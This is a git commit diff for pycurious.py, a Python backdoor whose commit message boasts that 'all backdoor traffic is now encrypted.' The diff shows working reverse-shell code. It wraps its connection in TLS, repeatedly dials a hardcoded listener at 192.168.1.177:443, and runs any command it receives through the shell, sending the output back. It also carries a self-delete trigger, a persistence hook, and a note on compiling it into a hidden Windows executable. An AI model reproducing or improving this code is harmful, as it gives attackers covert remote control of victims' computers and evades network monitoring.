56e51861899ad2dd16d0e049ffa5e29d1b959ef1
Ben Leonard-Lagarde <leonardlagardeb@gmail.com>
2016-01-19 00:02:17 +0000

    Added SSL, all backdoor traffic is now encrypted!

--- pycurious.py
+++ pycurious.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-import subprocess, socket, sys, time, os, shlex
+import subprocess, socket, sys, time, os, shlex, ssl
 from random import randint
 
 def fubar(platform):
@@ -17,41 +17,45 @@ def winstart():
 	return data
 
 def main():
+	# openssl s_server -accept 443 -cert cacert.pen -key privkey.pem
 	# Change these values to match your listening host machine
-	host = "192.168.1.168"
-	port = 2015
+	host = "192.168.1.177"
+	port = 443
 	
 	retry = 60 # This value corresponds to the time period in seconds in between connection attempts
 	hostname = str(socket.gethostname())
 	platorm = os.name
 	time.sleep(randint(3, 20))
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	wrappedSocket = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA")
+
 	while True:
 		try:
-			sock.connect((host, port))
+			wrappedSocket.connect((host, port))
 			break
 		except Exception, e:
 			time.sleep(randint(10, retry))
 			pass
-	sock.send("\n<Connection established to " + hostname + ", use 'qqq' to exit>\n")
+	wrappedSocket.send("\n<Connection established to " + hostname + ", use 'qqq' to exit>\n")
 
-	# try:
+
 	while 1:
-		sock.send("\n"+os.getcwd()+">")
+		wrappedSocket.send("\n"+os.getcwd()+">")
 		#Ensure this value is a (relatively) low power of 2
 		try:
-			data = sock.recv(4096)
+			data = wrappedSocket.recv(1280)
 		except:
 			break
 		# Use this this to close the connection
 		if data.startswith("qqq"):
 			break
-		if data.startswith("winstart!"):
+		elif data.startswith("winstart!"):
 			data = winstart()
 			pass
 		# If detected use this to delete the file from the machine, should work even if file is renamed (Experimental...)
 		elif data.startswith("FUBAR!"):
-				sock.send("Delete from: "+sys.argv[0]+"\n")
+				wrappedSocket.send("Delete from: "+sys.argv[0]+"\n")
 				fubar(platorm)
 		# Working directory change 'hack'
 		elif data.startswith("cd "):
@@ -60,16 +64,25 @@ def main():
 			try:
 				os.chdir(Dir[1])
 			except:
-				sock.send("Unknown Dir or Drive\n")
+				wrappedSocket.send("Unknown Dir or Drive\n")
 			pass
-		process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		stdout_val = process.stdout.read() + process.stderr.read()
-		sock.send(stdout_val)
-	sock.close()
+		try:
+			process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			stdout_val = process.stdout.read() + process.stderr.read()
+			wrappedSocket.send(stdout_val)
+		except:
+			break
+	while 1:
+		try:
+			wrappedSocket.close()
+			break
+		except:
+			pass
+
 	time.sleep(randint(10, 60))
 	main()
 
 if __name__ == "__main__":
-    main()	
+    main()
 
-#
+#pyinstaller.exe --onefile --windowed pycurious.py
